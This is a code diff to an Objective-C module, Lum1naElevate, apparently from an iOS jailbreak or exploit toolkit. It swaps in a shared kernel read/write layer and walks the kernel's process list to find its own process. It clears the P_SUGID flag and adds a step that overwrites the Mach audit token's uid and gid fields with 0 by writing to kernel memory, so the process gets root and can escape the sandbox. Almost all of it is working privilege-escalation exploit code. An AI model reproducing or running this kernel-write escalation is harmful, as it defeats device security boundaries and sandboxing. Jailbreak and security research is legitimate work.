@@ -6,9 +6,7 @@
 #import "Lum1naElevate.h"
 #import "Lum1naStructOffsets.h"
 #import "Lum1naBoard.h"
-#import "../Exploit/Lum1naSocketKRW.h"
-#import "../Exploit/Lum1naLibkrw.h"
-#import "../Exploit/Lum1naCS2Core.h"
+#import "Lum1naKreadLane.h"
 #import "../Exploit/LabRuntimeOffsets.h"
 #import "../Exploit/LabLocalTime.h"
 
@@ -45,40 +43,12 @@ static void el_bad(NSMutableString *s, NSString *fmt, ...) {
     [s appendFormat:@"[-] %@\n", line];
 }
 
-#pragma mark - lane cascade (same shape as AfterKread)
+#pragma mark - lane cascade (Lum1naKreadLane - shared with P094/P095)
 
-static uint64_t el_kread64(uint64_t a) {
-    Lum1naBoard *b = [Lum1naBoard shared];
-    Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
-    if (ctx) return Lum1naSocketKRW_KRead64(ctx, a);
-    if (Lum1naLibkrw_IsLive()) return Lum1naLibkrw_KRead64(a);
-    if (Lum1naCS2Core_IsLive()) return Lum1naCS2Core_KRead64(a);
-    return 0;
-}
-static uint32_t el_kread32(uint64_t a) {
-    Lum1naBoard *b = [Lum1naBoard shared];
-    Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
-    if (ctx) return Lum1naSocketKRW_KRead32(ctx, a);
-    if (Lum1naLibkrw_IsLive()) return Lum1naLibkrw_KRead32(a);
-    if (Lum1naCS2Core_IsLive()) return Lum1naCS2Core_KRead32(a);
-    return 0;
-}
-static BOOL el_kwrite64(uint64_t a, uint64_t v) {
-    Lum1naBoard *b = [Lum1naBoard shared];
-    Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
-    BOOL ok = ctx ? Lum1naSocketKRW_KWrite64(ctx, a, v) : NO;
-    if (!ok && Lum1naLibkrw_IsLive()) ok = Lum1naLibkrw_KWrite64(a, v);
-    if (!ok && Lum1naCS2Core_IsLive()) ok = Lum1naCS2Core_KWrite64(a, v);
-    return ok;
-}
-static BOOL el_kwrite32(uint64_t a, uint32_t v) {
-    Lum1naBoard *b = [Lum1naBoard shared];
-    Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
-    BOOL ok = ctx ? Lum1naSocketKRW_KWrite32(ctx, a, v) : NO;
-    if (!ok && Lum1naLibkrw_IsLive()) ok = Lum1naLibkrw_KWrite32(a, v);
-    if (!ok && Lum1naCS2Core_IsLive()) ok = Lum1naCS2Core_KWrite32(a, v);
-    return ok;
-}
+#define el_kread64(a)        Lum1naLaneKRead64(a)
+#define el_kread32(a)        Lum1naLaneKRead32(a)
+#define el_kwrite64(a, v)    Lum1naLaneKWrite64(a, v)
+#define el_kwrite32(a, v)    Lum1naLaneKWrite32(a, v)
 
 /// Kernel zone/dynamic pointer heuristic: procs are zone allocations
 /// (0xFFFFFFE0...+ per Dopamine VM_PAGE_PACKED_PTR_BASE), while the
@@ -86,6 +56,9 @@ static BOOL el_kwrite32(uint64_t a, uint32_t v) {
 /// stops at the head this way.
 static BOOL el_looks_zone(uint64_t v) {
     return v >= 0xFFFFFFE000000000ULL && v < 0xFFFFFFF000000000ULL;
+}
+static BOOL el_looks_static(uint64_t v) {
+    return v >= 0xFFFFFFF000000000ULL;
 }
 
 @implementation Lum1naElevate
@@ -98,10 +71,10 @@ static BOOL el_looks_zone(uint64_t v) {
 
     el_log(s, @"=== ELEVATE %@ ===", LabLocalMilitaryNow() ?: @"?");
 
-    if (!b.hasKread || (!b.krwContext && !Lum1naLibkrw_IsLive() && !Lum1naCS2Core_IsLive())) {
-        el_bad(s, @"elevate SKIP - hasKread=%@ lane=%@",
+    if (!b.hasKread || !Lum1naLaneLive()) {
+        el_bad(s, @"elevate SKIP - hasKread=%@ lane=%s",
                b.hasKread ? @"YES" : @"NO",
-               b.krwContext ? @"socketkrw" : (Lum1naLibkrw_IsLive() ? @"libkrw" : (Lum1naCS2Core_IsLive() ? @"cs2core" : @"none")));
+               Lum1naLaneName());
         return s;
     }
     if (!po) {
@@ -110,19 +83,24 @@ static BOOL el_looks_zone(uint64_t v) {
     }
 
     uint64_t slide = b.kslide;
-    if (!po->kernproc) {
-        el_bad(s, @"elevate HOLD - kernproc VA underived for %@ (Ghidra allproc task queued).",
+    if (!po->kernproc && ![b provenKernproc]) {
+        el_bad(s, @"elevate HOLD - kernproc VA underived for %@ (LabProcOff 0 AND no p094 proven value).",
                off ? [NSString stringWithUTF8String:off->tag] : @"?");
+        el_log(s, @"Unlock path: tap P094 kernproc derive (catalog p094) on this device, then re-run.");
         el_log(s, @"uid0/unsandbox/platformize not attempted; AMFI/inject continue sandboxed (expected EPERM).");
         [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-underived" source:@"elevate"];
         return s;
     }
-    uint64_t kernproc = po->kernproc + slide;
+    uint64_t kernprocStatic = po->kernproc ? po->kernproc : [b provenKernproc];
+    NSString *kpSource = po->kernproc ? @"LabProcOff" : @"p094-proven";
+    uint64_t kernproc = kernprocStatic + slide;
+    el_log(s, @"kernproc source %@: unslid 0x%llx", kpSource, (unsigned long long)kernprocStatic);
 
     // 1. find our proc: kernproc is proc 0 (oldest); walk p_list.le_prev
     //    backward. le_prev holds &prev->le_next, and le_next sits at
-    //    offset 0, so the value IS the previous proc. Stop at the static
-    //    list head (not a zone pointer).
+    //    offset 0, so the value IS the previous proc. When the value is
+    //    STATIC (0xFFFFFFF0...) it is &proc0.le_next == proc0 itself
+    //    (proc0 is a static kernel global; p_list sits at offset 0).
     if (el_kread32(kernproc + po->proc_pid) != 0) {
         el_bad(s, @"elevate HOLD - kernproc sanity failed (pid!=0 at 0x%llx). VA wrong; keep underived.",
                (unsigned long long)kernproc);
@@ -134,8 +112,13 @@ static BOOL el_looks_zone(uint64_t v) {
     for (int i = 0; i < 4096; i++) {
         if (el_kread32(cur + po->proc_pid) == (uint32_t)mypid) { selfp = cur; break; }
         uint64_t prev = cs2_unpac_ptr(el_kread64(cur + po->proc_list_prev));
-        if (!el_looks_zone(prev)) break;
-        cur = prev;
+        if (!prev || prev == cur) break;
+        if (el_looks_zone(prev)) { cur = prev; continue; }
+        if (el_looks_static(prev)) {
+            /* proc0 edge: static le_prev IS proc0's address. */
+            if (el_kread32(prev + po->proc_pid) == 0) { cur = prev; continue; }
+        }
+        break;
     }
     if (!selfp) {
         el_bad(s, @"elevate HOLD - our proc (pid %d) not found in allproc backward walk", mypid);
@@ -169,6 +152,29 @@ static BOOL el_looks_zone(uint64_t v) {
     uint32_t flag = el_kread32(selfp + po->proc_flag);
     if (flag & LAB_P_SUGID) {
         el_kwrite32(selfp + po->proc_flag, flag & ~LAB_P_SUGID);
+    }
+
+    // 4b. audit_token fix (Dopamine proc_ucred_update_content verbatim):
+    //     auditToken = proc_ro + task_tokens + 0x8; uid@+4 gid@+8 ruid@+12
+    //     rgid@+16. WITHOUT this the Mach audit token still carries euid
+    //     501 - and Dopamine's Root-domain gate reads audit_token_to_euid,
+    //     so libkrw/opainject would stay refused even with getuid()==0.
+    //     task_tokens is REMOVED on darwin 25+ (26.5) - row value 0 skips.
+    if (po->pro_ro_task_tokens) {
+        uint64_t auditToken = proc_ro + po->pro_ro_task_tokens + LAB_TASK_TOKEN_AUDIT;
+        uint32_t auid = el_kread32(auditToken + LAB_TT_UID_OFF);
+        if (auid == (uint32_t)getuid() || auid == 501 || auid == 0) {
+            el_kwrite32(auditToken + LAB_TT_UID_OFF,  0);
+            el_kwrite32(auditToken + LAB_TT_GID_OFF,  0);
+            el_kwrite32(auditToken + LAB_TT_RUID_OFF, 0);
+            el_kwrite32(auditToken + LAB_TT_RGID_OFF, 0);
+            el_log(s, @"audit_token fixed at proc_ro+0x%x+0x8 (uid/gid/ruid/rgid -> 0)",
+                   po->pro_ro_task_tokens);
+        } else {
+            el_bad(s, @"audit_token uid=%u unexpected - task_tokens offset suspect, fix SKIPPED", auid);
+        }
+    } else {
+        el_log(s, @"task_tokens=0 for this SKU (darwin 25+) - audit fix skipped (token built at exec).");
     }
 
     if (getuid() != 0 || getgid() != 0) {
